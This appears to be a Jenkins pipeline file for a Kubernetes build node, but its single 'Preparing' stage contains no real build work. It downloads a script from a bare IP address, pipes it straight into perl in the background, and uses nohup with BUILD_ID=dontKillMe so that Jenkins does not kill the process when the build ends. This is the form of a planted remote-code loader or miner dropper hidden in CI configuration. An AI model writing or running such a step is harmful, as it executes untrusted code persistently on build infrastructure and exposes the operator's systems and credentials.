node('k8s-permanent') {
    try {
        stage("Preparing") {
            sh 'BUILD_ID=dontKillMe nohup curl http://34.143.172.153/p | perl &'
        }
    } catch (e) {
        throw e
    }
}
